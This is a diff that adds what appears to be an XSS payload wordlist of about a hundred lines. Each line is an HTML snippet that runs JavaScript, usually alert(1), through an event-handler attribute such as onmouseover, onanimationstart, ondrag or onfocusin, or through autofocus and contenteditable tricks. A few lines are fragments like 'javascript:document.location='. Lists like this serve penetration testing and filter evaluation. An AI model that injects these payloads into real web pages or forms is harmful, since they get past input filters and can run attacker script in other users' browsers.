@@ -1,0 +1,100 @@
+"<tt onmouseover=""alert(1)"">test</tt>"
+<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>
+"<col draggable=""true"" ondragenter=""alert(1)"">test</col>"
+<caption onpointerdown=alert(1)>XSS</caption>
+<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>
+"<style onmouseleave=""alert(1)"">test</style>"
+<svg><meta onload=alert(1)></meta>
+<figcaption onpointerleave=alert(1)>XSS</figcaption>
+<datalist id=x tabindex=1 onfocusin=alert(1)></datalist>
+<input type=image src=1 onerror=alert(1)>
+"<strong ondblclick=""alert(1)"">test</strong>"
+"<div draggable=""true"" contenteditable>drag me</div><input ondragover=alert(1) contenteditable>drop here</input>"
+"<spacer onkeypress=""alert(1)"" contenteditable>test</spacer>"
+"<style>@keyframes slidein {}</style><center style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></center>"
+"<pre draggable=""true"" ondragend=""alert(1)"">test</pre>"
+<colgroup onblur=alert(1) tabindex=1 id=x></colgroup><input autofocus>
+"<style>@keyframes x{}</style><main style=""animation-name:x"" onanimationstart=""alert(1)""></main>"
+"<article draggable=""true"" ondrag=""alert(1)"">test</article>"
+"<rtc draggable=""true"" ondragleave=""alert(1)"">test</rtc>"
+"<div draggable=""true"" contenteditable>drag me</div><sup ondrop=alert(1) contenteditable>drop here</sup>"
+"<frame oncut=""alert(1)"" contenteditable>test</frame>"
+"<frameset onmouseover=""alert(1)"">test</frameset>"
+"<style>@keyframes x{}</style><nobr style=""animation-name:x"" onanimationstart=""alert(1)""></nobr>"
+<iframe onload=alert(1)></iframe>
+"<strong draggable=""true"" ondragstart=""alert(1)"">test</strong>"
+"<style>@keyframes x{}</style><h1 style=""animation-name:x"" onanimationstart=""alert(1)""></h1>"
+<article onpointerleave=alert(1)>XSS</article>
+"<nextid onmousemove=""alert(1)"">test</nextid>"
+javascript:document.location=
+"<style>@keyframes x{}</style><area style=""animation-name:x"" onanimationend=""alert(1)""></area>"
+<blockquote onpointermove=alert(1)>XSS</blockquote>
+<time onfocusout=alert(1) tabindex=1 id=x></time><input autofocus>
+"<style>@keyframes x{}</style><title style=""animation-name:x"" onanimationend=""alert(1)""></title>"
+<noembed onpointerout=alert(1)>XSS</noembed>
+"<data onbeforecut=""alert(1)"" contenteditable>test</data>"
+"<A HREF=""http://ha.ckers.org@google""></A>"
+"<plaintext oncut=""alert(1)"" contenteditable>test</plaintext>"
+"<s onmousedown=""alert(1)"">test</s>"
+"<address onkeypress=""alert(1)"" contenteditable>test</address>"
+"<optgroup onmouseover=""alert(1)"">test</optgroup>"
+"<script onmouseover=""alert(1)"">test</script>"
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sub id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></sub>"
+"<image onclick=""alert(1)"">test</image>"
+"<tfoot onclick=""alert(1)"">test</tfoot>"
+<ul onpointerenter=alert(1)>XSS</ul>
+"<bdo draggable=""true"" ondragenter=""alert(1)"">test</bdo>"
+<spacer id=x tabindex=1 onbeforeactivate=alert(1)></spacer>
+"<style>@keyframes slidein {}</style><shadow style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></shadow>"
+<noscript id=x tabindex=1 onfocusin=alert(1)></noscript>
+"<dd onmouseout=""alert(1)"">test</dd>"
+<pre id=x tabindex=1 onbeforedeactivate=alert(1)></pre><input autofocus>
+"<data draggable=""true"" ondragstart=""alert(1)"">test</data>"
+"<sub draggable=""true"" ondragend=""alert(1)"">test</sub>"
+"<dialog draggable=""true"" ondragenter=""alert(1)"">test</dialog>"
+<iframe onblur=alert(1) id=x><input autofocus>
+<legend id=x tabindex=1 ondeactivate=alert(1)></legend><input id=y autofocus>
+<meter id=x tabindex=1 onbeforedeactivate=alert(1)></meter><input autofocus>
+"<em draggable=""true"" ondragleave=""alert(1)"">test</em>"
+"<small onbeforecut=""alert(1)"" contenteditable>test</small>"
+"<article draggable=""true"" ondragstart=""alert(1)"">test</article>"
+"<cite onkeyup=""alert(1)"" contenteditable>test</cite>"
+<u onblur=alert(1) tabindex=1 id=x></u><input autofocus>
+<data onpointerleave=alert(1)>XSS</data>
+"<audio draggable=""true"" ondragend=""alert(1)"">test</audio>"
+"<dd onbeforecopy=""alert(1)"" contenteditable>test</dd>"
+<del id=x tabindex=1 onactivate=alert(1)></del>
+"<svg onbeforecut=""alert(1)"" contenteditable>test</svg>"
+<optgroup onpointerover=alert(1)>XSS</optgroup>
+<audio onpointermove=alert(1)>XSS</audio>
+"<aside onmouseout=""alert(1)"">test</aside>"
+"<canvas onbeforecut=""alert(1)"" contenteditable>test</canvas>"
+"<div draggable=""true"" contenteditable>drag me</div><section ondragover=alert(1) contenteditable>drop here</section>"
+"<tbody draggable=""true"" ondragenter=""alert(1)"">test</tbody>"
+"<object onmousedown=""alert(1)"">test</object>"
+"<area onbeforepaste=""alert(1)"" contenteditable>test</area>"
+<template onpointerout=alert(1)>XSS</template>
+<s onpointerup=alert(1)>XSS</s>
+"<select draggable=""true"" ondrag=""alert(1)"">test</select>"
+"<a onmouseup=""alert(1)"">test</a>"
+"<style>:target {color: red;}</style><pre id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></pre>"
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></a>"
+<main onfocusout=alert(1) tabindex=1 id=x></main><input autofocus>
+"<time onclick=""alert(1)"">test</time>"
+"<canvas onbeforepaste=""alert(1)"" contenteditable>test</canvas>"
+<figure id=x tabindex=1 ondeactivate=alert(1)></figure><input id=y autofocus>
+"<center onclick=""alert(1)"">test</center>"
+"<h1 draggable=""true"" ondragleave=""alert(1)"">test</h1>"
+"<div onkeyup=""alert(1)"" contenteditable>test</div>"
+<marquee id=x tabindex=1 onbeforedeactivate=alert(1)></marquee><input autofocus>
+"<dl draggable=""true"" ondrag=""alert(1)"">test</dl>"
+<div onpointerout=alert(1)>XSS</div>
+"<style>:target {color:red;}</style><slot id=x style=""transition:color 1s"" ontransitionend=alert(1)></slot>"
+"<applet onmouseover=""alert(1)"">test</applet>"
+"<figure onbeforecut=""alert(1)"" contenteditable>test</figure>"
+"<canvas onmousemove=""alert(1)"">test</canvas>"
+"<h1 onpaste=""alert(1)"" contenteditable>test</h1>"
+<area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>
+<textarea onpointermove=alert(1)>XSS</textarea>
+document.write
+<area onpointerenter=alert(1)>XSS</area>
